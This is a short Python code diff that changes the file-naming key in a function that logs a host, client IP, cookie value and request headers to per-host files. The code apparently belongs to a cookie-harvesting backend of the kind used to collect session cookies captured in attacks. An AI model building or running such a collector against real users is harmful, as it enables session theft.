@@ -26,12 +26,12 @@ async def save_data(data, ip, header):
     header = header.replace("\n", "")
 
     if os.path.isdir(f"{os.getcwd()}/cookies"):
-        with open(f"cookies/{data['host']}.txt", "a", encoding="utf-8") as f:
+        with open(f"cookies/{data['hostname']}.txt", "a", encoding="utf-8") as f:
             f.write(get_time + '\n' + 'HOST：' + data['host'] + '\t\nip：' + ip + '\t' + '\nCookie: ' + data[
                 'cookie'] + '\n\n' + 'Headers：\n' + header + '\n')
     else:
         os.mkdir(f"{os.getcwd()}/cookies")
-        with open(f"cookies/{data['host']}.txt", "a", encoding="utf-8") as f:
+        with open(f"cookies/{data['hostname']}.txt", "a", encoding="utf-8") as f:
             f.write(get_time + '\n' + 'HOST：' + data['host'] + '\t\nip：' + ip + '\t' + '\nCookie: ' + data[
                 'cookie'] + '\n\n' + 'Headers：\n' + header + '\n')
 
